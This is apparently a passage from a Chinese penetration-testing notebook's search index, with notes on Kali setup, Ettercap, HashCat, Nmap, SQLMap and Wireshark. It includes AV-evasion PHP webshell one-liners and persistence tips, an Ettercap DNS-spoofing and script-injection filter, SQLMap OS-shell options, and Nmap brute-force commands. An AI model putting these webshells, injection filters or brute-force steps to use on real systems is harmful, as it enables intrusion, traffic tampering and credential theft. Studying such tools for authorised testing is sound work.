当用菜刀连接时，无需密码 通过常量的定义 字符串拼接 定义函数强行分割 定义类强行分割 name\"); } } $user = new User; $user -> name = \"._REQUEST[1]\"; ?> 多方式传参免杀 $value){ if($key == 'assert'){ $key($_REQUEST[1]); } } ?> 返回所有函数进行绕过 绕过WAF的终极 但数据库中必须有一个字段的值是eval($_REQUEST[a]) 拿到WebShell后如何维持住权限 打开cmd命令行 输入echo \"\" > /:1.txt 在新建一个1.php，写包含一句话木马 "},"NoteBook/kali的使用/":{"url":"NoteBook/kali的使用/","title":"kali","keywords":"","body":""},"NoteBook/kali的使用/kali配置.html":{"url":"NoteBook/kali的使用/kali配置.html","title":"kali配置","keywords":"","body":"IP设置 配置文件：/etc/networking/interface 临时IP ifconfig eth0 192.168.31.111/24 永久IP auto eth0 #iface eth0 inet dhcp #如果原文件中有这一行，就注释掉 iface eth0 inet static address 192.168.1.53 netmask 255.255.255.0 gateway 192.168.1.1 动态IP auto eth0 iface eth0 inet dhcp 配置默认路由 route add default gw 192.168.1.1 重启网络命令 service networking restart DNS配置 配置文件：/etc/resolv.conf 命令 echo nameserver 8.8.8.8 > /etc/resolv.conf 或者 gedit /etc/resolv.conf 添加 nameserver 8.8.8.8 更换源文件 配置文件：/etc/apt/sources.list #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib deb http://mirrors.163.com/debian/ jessie main non-free contrib deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb-src http://mirrors.163.com/debian/ jessie main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib 更新命令 apt-get update # 取回更新的软件包列表信息 apt-get upgrade # 进行一次升级 apt-get clean # 删除已经下载的安装包 reboot #重启 XShell远程连接 修改配置文件gedit /etc/ssh/sshd_config【把注释去掉】 重启服务/etc/init.d/ssh restart 配置开机启动update-rc.d ssh enable 关闭开机启动update-rc.d ssh disable "},"NoteBook/kali的使用/Ettercap.html":{"url":"NoteBook/kali的使用/Ettercap.html","title":"Ettercap","keywords":"","body":"Ettercap的使用 常用指令 用户界面指令 通用选线项 日志选 嗅探与执行方式 指令 说明 指令 说明 指令 说明 指令 说明 -T 使用只显示字符 -i 使用网络接口 -w 将嗅探到的数据写入到pcap文件中量 -M 执行Mitm攻击 -q 安静模式，不显示抓到数据包的内容 -l 显示所有的网络接口 -L 此处计量所有流 gt > 大于 -P 开始该插件 -G 图形化启动 -F 加载过滤器 案例 DNS劫持 ettercap -G 选择网络接口 扫描IP，打开IP列表 添加网关和攻击IP 在Mitm中选择arp攻击方式，勾选第一个选项 在Plugins中选择自带的插件dns_spoof 修改etter.dns配置文件 cd /etc/ettercap/etter.dns leafpad etter.dns 开始攻击 访问网站弹框 1-7和上面的一样 找到可以让网站弹框脚本，保存为.filter文件 // 弹框脚本 if (ip.proto == TCP && tcp.dst == 80) { if (search(DATA.data, \"Accept-Encoding\")) { pcre_regex(DATA.data, \"(Accept-Encoding:).*([\\r\\n])\", \"$1 identity$2\"); msg(\"change encoding\"); } } if (ip.proto == TCP && tcp.src == 80) { if (search(DATA.data, \"\")) { replace(\"\", \"alert('js inject')\"); msg(\"inject head\"); } } 编译filter文件为ef文件 在Filters中选择导入编译好的ef文件 开始攻击 查看对方浏览器 1-7相同 在Plugins中选择自带的插件remote_browser 开始攻击 如果想查看网站的图片 driftnet -i eth0 "},"NoteBook/kali的使用/HashCat.html":{"url":"NoteBook/kali的使用/HashCat.html","title":"HashCat","keywords":"","body":"HashCat 扫描模式 字典破解：Straight【0】 基于字典破解 组合破解：Combination【1】 基于多个字典 掩码暴力破解：Brute-force【3】 基于掩码设置破解 字典 + 掩码破解：Hydrib Wordlist + Mask【6】 掩码 + 字典破解：Hydirb Mask + Wordlist【7】 掩码设置 参数 说明 l a-z26个小写字母 u A-Z26个大写字母 d 0-9数字 h 0-9和a-z小写字母 H 0-9和A-Z大写字母 s 特殊字符 a 代表上面的全部 b 0x00-0xff【用来匹配空格这种的】 常用指令 参数 说明 案例 -a 指定破解模式 -a 0【字典破解】-a 1 【组合破解】 -m 指定破解的Hash类型，默认是md5 -o 保存到文件中 --force 忽略破解过程中的警告信息【跑单条Hash可能用到】 --show 显示已经破解的Hahs值及Hash对应的明文 --increment 增量破解，指定密码长度 --increment-min【最小值】--increment-max【最大值】 密码组合 八位数字密码 ?d?d?d?d?d?d?d?d 八位数字字母密码【前4个小写字母或数字，后4个大写字母后者数字】 ?h?h?h?h?H?H?H?H 八位未知密码 ?a?a?a?a?a?a?a?a 二到十位小写字母密码 --increment --increment-min 2 --increment-max 10 ?l?l?l?l?l?l?l?l 二到十位未知密码 --increment --increment-min 2 --increment-max 10 ?a?a?a?a?a?a?a?a 前面三个未知中间是root后面两个未知 ?a?a?aroot?a?a 案例 通过掩码破解MD5值 hashcat.exe -a 3 -m 0 46f94c8de14fb36680850768ff1b7f2a ?d?d?d?l?l?l 通过字典破解MD5值 先写Hash值，后写密码文件 hashcat.exe -a 0 -m 0 hash.txt passwords.txt ?d?d?d?l?l?l "},"NoteBook/kali的使用/Nmap.html":{"url":"NoteBook/kali的使用/Nmap.html","title":"Nmap","keywords":"","body":"Nmap 常见扫描方式 无任何附加参数 nmap 192.168.31.177 如果是超级用户，无参数扫描相当于是sS扫描 其他用户相当于sT扫描【TCP 完整扫描】 指定端口 nmap -p 8080 192.168.30.177 系统探测 nmap -O 192.168.30.177 nmap -A 192.168.30.177 主机发现 nmap -sn 192.168.30.177 【只是用ping扫描来发现】 跳过主机发现 nmap -Pn 192.168.30.177 【穿透防火墙】 扫描和版本号侦测 nmap -sV 192.168.30.177 【侦测开放的端口来判断开放的服务，并检测对应的版本】 UDP扫描 nmap -sU 192.168.30.177 TCP扫描 nmap -sT 192.168.30.177 STCP扫 【通过STCP协议进行扫描主机】 nmap -PY 192.168.30.177 漏洞扫描 nmap --script=vuln 192.168.30.177 【使用vuln脚本扫描漏洞】 IPV6扫描 nmap -6 192.168.30.177 路由跟踪 【帮助用户了解网络情况，可以查出本地计算机到目标之间所经过的网络节点并可以查看到通过各个节点的时间】 nmap 192.168.30.177 -traceroute 保存输出 标准输出 【txt格式的】 nmap -oN test.txt XML输出【XML格式的】 nmap -oX test.xml 端口扫描 端口状态 graph LR A[端口状态]-->Opend Opend-->端口开放 A-->Closed Closed-->端口关闭 A-->Filtered Filtered-->端口过滤,数据被防火墙拦截 A-->UnFiltered UnFiltered-->未被过滤,但不能识别端口当前的状态 A-->B[Openfiltered开放或者被过滤] B-->发生在UDP,IP,FIN,NULL和Xmas扫描中 A-->C[CloseFiltered关闭或者被过滤] C-->发生在IP,ID,idle扫描 graph LR S[端口扫描]-->S1[-p:指定端口扫描] S1-->指定一个端口进行扫描 指定一个端口进行扫描-->A[nmap -p 80 192.168.31.12] S1-->指定多个端口进行扫描 指定多个端口进行扫描-->B[nmap -p 80,88,135 192.168.31.123] S1-->指定一段端口进行扫描 指定一段端口进行扫描-->C[nmap -p 1-1000 192.168.31.123] S1-->D[--top-ports默认1000开放最高的TCP端口] D-->D1[nmap --top-ports 1000 192.168.31.123]; ARP 扫描 graph LR; S[ARP Ping扫描]-->-PR -PR-->通常在局域网中扫描,使用地址解析协议,本地局域网不会禁止ARP请求; ICMP扫描 graph LR; S[ICMP Ping Types扫描] --> -PE -PE--> 使用ICMP扫描方式 使用ICMP扫描方式--> A[通过发送ICMP Echo数据包来探测数据是否存活,在内网中能达到穿透防火墙的效果]; S-->-PP -PP--> 使用时间戳Ping扫描 使用时间戳Ping扫描--> A; S-->-PM -PM--> 使用ICMP地址掩码ping扫描 使用ICMP地址掩码ping扫描--> A; TCP扫描 graph LR; SYN扫描 --> -sS -sS--> 半开放扫描,速度较快,隐蔽性好 半开放扫描,速度较快,隐蔽性好--> A[nmap -sS 192.168.30.123]; 连接扫描 --> -sT -sT--> 扫描速度快,准确性高,但容易被防火墙发现 扫描速度快,准确性高,但容易被防火墙发现--> B[nmap -sT 192.168.30.123]; ACK扫描 --> -sA -sA-->A1[用于发现防火墙规则,确定它们是有状态的还是无状态的,哪些端口是被过滤的] A1-->C[nmap -sA 192.168.30.123]; A11[TCP SYN Ping扫描] --> -PS -PS--> B11[当防火墙阻止TCP ACK和ICMP Echo请求时可以通过SYNping扫描来判断主机是否存活]; A12[TCP ACK Ping扫描] --> -PA -PA--> B12[很多防火墙会封锁SYN报文,通过ACKping扫描来判断目标主机是否存活]; UDP扫描 graph LR; UDP扫描 --> -sU -sU--> 扫描存在于UDP端口的程序,速度较慢 扫描存在于UDP端口的程序,速度较慢--> A[nmap -sU 192.168.30.123]; UDPping扫描 --> -PU -PU--> A1[Nmap会发送一个空UDP包到目标主机]; A1 -->主机响应范围一个ICMP端口不可达则主机存货; A1 --> 主句不存货则返回各种ICMP错误信息; Ping扫描 graph LR; Ping扫描 --> -sP -sP --> 使用平扫描,然后回显并作出响应的主机,获取目标主机信息而不会被轻易发现 无ping扫描 --> -P0 -P0 --> A[同于防火墙进制ping的情况下启动高强度扫描,可用于穿透防火墙同时避免防火墙发现] 无ping扫描 --> -Pn -Pn--> A 其他扫描 域名扫描 graph LR; 列表扫描 --> -sL -sL --> 累出指定网络上的每台主机,默认使用域名解析获取他们的名字; 进制反向域名解析 --> -n -n --> 不对目标进行反向域名解析; 反向域名解析 --> -R -R--> 对目标地址进行反向域名解析; 系统域名解析器 --> A1[\"--system-dns\"] A1--> A[通过直接发行查询到主机上自带配置的域名服务解析域名]; 启动IPV6扫描 --> -6; 指纹识别 graph LR; 端口服务版本探测 --> -sV -sV--> 通过端口对应处响应的服务器,识别出相对应的版本; 全端口服务探测 --> B1[--allports] B1-->B[启用全端口版本扫描,会跳过9100 TCP段]; 系统and版本探测 --> -A -A--> A1[打开操作系统探测,版本探测,脚本扫描,路径跟踪] A1--> A[nmap -A 192.168.30.123]; 获取详细版本信息 --> C1[--version-trace] C1--> C[获取详细版本信息,对获取目标主机的额外信息有帮助]; 系统探测 --> 操作系统探测 操作系统探测--> D1[-O] D1-->D[windows和linux有区别]; 操作系统探测 --> E1[\"--osscan-limit\"] E1--> E[对C段目标进行探测,需要配合-A和-O]; 系统探测 --> 探测系统识别 探测系统识别--> F1[\"--osscan-guess\"] F1-->F[当无法准确识别系统时可以利用这两个参数进行猜测系统]; 探测系统识别 --> G[\"--fuzzy\"] G-->F; RCP扫描 --> -sR -sR--> 扫描是否为PRC端口,存在PRC端口即返回程序和版本号; 空闲扫描 graph LR; -sl --> 运行进行端口完全欺骗扫描,伪装额外主机对目标进行扫描; 隐藏扫描 graph LR; -sN --> A( 能躲过一些无状态防火墙和报文过滤的路由器,比SYN还隐蔽); -sF --> A; -sX --> A; 信息收集 WhoIs查询 脚本名称：whois-domain.nse 【查询目标WhoIs信息】 nmap --script=whois-domain.nse 192.168.30.177 DNS信息收集 脚本名称：dns-brute.nse 【通过DNS记录进行查询并且进行爆破】 nmap --script=dns-brute.nse 192.168.30.177 扫描WEB漏洞 脚本名称：http:stored-xss.nse 【扫描XSS】 nmap --script=http:stored-xss.nse 192.168.30.177 还有很多脚本 漏洞利用 检测MySQL密码 脚本名称：mysql-empty-password 【检查目标是否存在弱口令或者密码为root】 nmap --script=mysql-empty-password 192.168.30.177 FTP服务认证 脚本名称：ftp-brute【爆破目标是否存在弱口令】 nmap --script=ftp-brute 192.168.30.177 -p 21 使用字典 nmap --script=ftp-brute --script-args userdb=user.txt,passdb=pass.txt 192.168.30.177 -p 21 wordpress认证 脚本名称：http-wordpress-brute nmap --script=http-wordpress-brute 192.168.30.177 -p 80 使用字典 nmap --script=http-wordpress-brute --script-args userdb=user.txt,passdb=pass.txt 192.168.30.177 -p 80 "},"NoteBook/kali的使用/SQLMap.html":{"url":"NoteBook/kali的使用/SQLMap.html","title":"SQLMap","keywords":"","body":"跑数据 指定目标 -u : 指定URL -m : 把URL保存在文件中，SQLMap回一个一个进行检测 数据库版本号 --banner | -b : 大多数数据库都有一个返回数据库版本的函数【version() | @@version】 用户 -current-user : 当前用户 -users : 所有用户 --is-dba : 当前用户是否为管理员权限 --privileges : 如果--is-dba是TRUE的话，很可能列举出每个用户的权限 系统架构 --schema : 获取数据库的架构【所有的数据库、数据表、数据字段及各自类型，加上--exclude-sysdbs将不会获取数据库自带的系统内容】 跑数据库 -current-db : 当前数据库 --dbs : 跑数据库 -D : 指定数据库 跑数据表 --tables : 跑数据表 -T : 指定数据表 --common-tables : 如果--tables没有数据表显示，可用该参数暴力破解数据表【指定字典】 跑数据字段 --columns : 跑数据字段 -C : 指定字段 --common-columns : 如果--columns没有数据表显示，可用该参数暴力破解数据字段【指定字典】 跑全部数据 --dump : 枚举数据 --passwords : 列出并进行破解密码【MD5加密】 --count : 获取数据个数不会获取其中的内容 请求方式 GET请求 -u : 默认请求时GET python3 sqlmap.py -u \"http://192.168.31.250\" POST请求 --froms : 自动搜索表单信息 --data : 把数据以POST方式进行提交 python3 sqlmap.py -u \"http://192.168.31.250\" --data \"id=1&ns=1\" COOKIE请求 --cookie : cookie请求 python3 sqlmap.py -u \"http://192.168.31.250\" –cookie \"id=11\" –level 2（只有level达到2才会检测cookie） HTTP请求头设置 User-agent头 --user-agent : 指定user-agent请求头 --random-agent : 选择随机的user-agent请求头 --mobile : 模拟一个手机的user-agent请求头 Host头 --host : 指定Host请求头 Referer头 --referer : 指定Referer请求头 其他请求头 --headers : 通过该参数来添加额外的HTTP头 请求延迟 --delay : 每次请求延迟 超时设置 --timeout : 请求多久判为延迟【默认10秒】 代理设置 --proxy : 使用本地端口进行代理【--porxy \"http://127.0.0.1:8080\" : 】 常见的其他指令 指定文件 -r : burp抓取到数据包，在疑似有问题的传参数据后加上\"*\" 如 : username=admin&password=123* -p : 需要配合-r，达到指定参数的效果 python3 sqlmap.py -r 1.txt -p 参数名 文件操作 --file-read : 读取文件 --file-write : 编辑文件 --file-dest : 写入文件 数据库操作 --sql-shell : SQL命令执行 --sql-query : 指定mysql进行查询 --sql-file : 从文件中执行mysql语句 系统操作 要求： 管理员root 有绝对路径 PHP自动转义gpc关闭 secrue_file_priv为空 --os-cmd : 执行操作系统命令 --os-shell : 交互式操作系统的shell "},"NoteBook/kali的使用/WireShark.html":{"url":"NoteBook/kali的使用/WireShark.html","title":"WireShark","keywords":"","body":"WireShark 分析数据包技巧 确定WireShark的位置【是否在公网上】 选择捕获接口，一般都是internet网络接口 使用捕获过滤器 使用显示过滤器【捕获后的数据包还是很复杂，用显示过滤器过滤的更加细致】 使用着色规则【更加突出某个会话】 构件图表【看一个网络的数据变化，图表方式更直接】 重组数据【大的文件会将信息分布在很多个数据宝忠】 工作模式 混杂模式 接受所有经过网卡的数据包，包括不是发给本地的数据包【即不验证MAC地址】 混杂模式的开启 普通模式 普通模式下只接收发给本地的数据包（包括广播包）传递给上层程序，其他的包一律丢弃 协议分析 ARP协议 ARP协议介绍 ==地址解析协议==，是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议，它在IPV4中很重要【ARP是通过网络地址来定位MAC地址】 ARP包内容 ARP协议工作流程 看到应答包补全了自己的MAC地址，目的地址和源地址做了替换 192.168.31.155 广播：谁有192.168.31.1的MAC地址？ 192.168.31.1 应答：192.168.31.1的MAC地址是xxxxxxxx ICMP协议 ICMP协议介绍 它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用 ICMP包内容 ICMP协议工作流程 本机发送一个ICMP Request包 接收方返回一个ICMP Reply包，包含了接收到的数据拷贝和一些其他指令 HTTP协议 TCP协议 TCP三次握手 第一次握手 第二次握手 第三次握手 TCP四次挥手 UDP-DNS协议 请求包 响应包 常用指令 运算符 比较运算符 逻辑运算符 运算符 说明 运算符 说明 eq == 等于 and && 逻辑与 ne != 不等于 or || 逻辑或 gt > 大于 xor ^^ 逻辑异或 lt 小于 not ! 逻辑非 ge >= 大于等于 le 小于等于 常见的过滤器 协议过滤器 语法 Protocal String String Comparsion opertor Value LogicalOptions Other expression 协议 值 值 比较运算符 值 逻辑运算符 其他协议 案例 显示POST提交的数据包或者是ICMP包 http.request.method==\"POST\" or icmp.type 显示IP地址为192.168.31.135的数据包 id.addr==192.168.31.135 显示来自10.20.0.0/16网段数据包 ip.src=10.20.0.0/16 显示主机为192.168.30.33的相关数据包 ip.host==192.168.30.33 显示http响应状态码为302的相关数据包 http.code==302 显示TCP端口号为80的数据包 tcp.port==80 显示目的TCP端口为80的数据包 tcp.dstport==80 内容过滤器 格式 contains [包含] 案例 显示包含\"http\"字符串的TCP数据包 tcp contains \"http\" 显示包含主机192.168.31.5的数据包 http.host contains 192.168.31.5 案例【解决服务器无法上网】 TTL Linux默认的TTL为64，每经过一个路由节点，TTL减1，TTL为0时，说明目标不可达并返回==Time to live exceeded== TTL：数据报文的生存周期 TTL的作用：防止数据包在公网无限制转发 模拟场景 修改主机 TTL 值为 1，下面的方式是我们临时修改内核参数。 echo \"1\" > /proc/sys/net/ipv4/ip_default_ttl 单独ping网关【网关：192.168.31.1】 可以ping通 ping一个网络地址 无法ping通，并返回了Time to live exceeded 再次修改一下TTL值 echo \"2\" > /proc/sys/net/ipv4/ip_default_ttl 再次ping网络地址 发现虽然返回的是==Time to live exceeded==，但是返回的IP地址不是网关，这证明了==数据包在网络中 已经到达了下一个网络设备才被丢弃==，由此我们还判断出我们的运营商网关地址为 171.120.52.1 但是我们并没有到达目标主机 修改回原来的TTL值 echo \"64\" > /proc/sys/net/ipv4/ip_default_ttl MTR 可以检测我们到达目标网络乊间的所有网络设备的网络质量，默认系统是没有安装 MTR 工具的我们手劢安装一下 apt install mtr 检测到达 8.8.8.8 所有节点的通信质量 mtr 8.8.8.8 我们可以看到从我当前主机到目标主机间经过 12 跳 "}}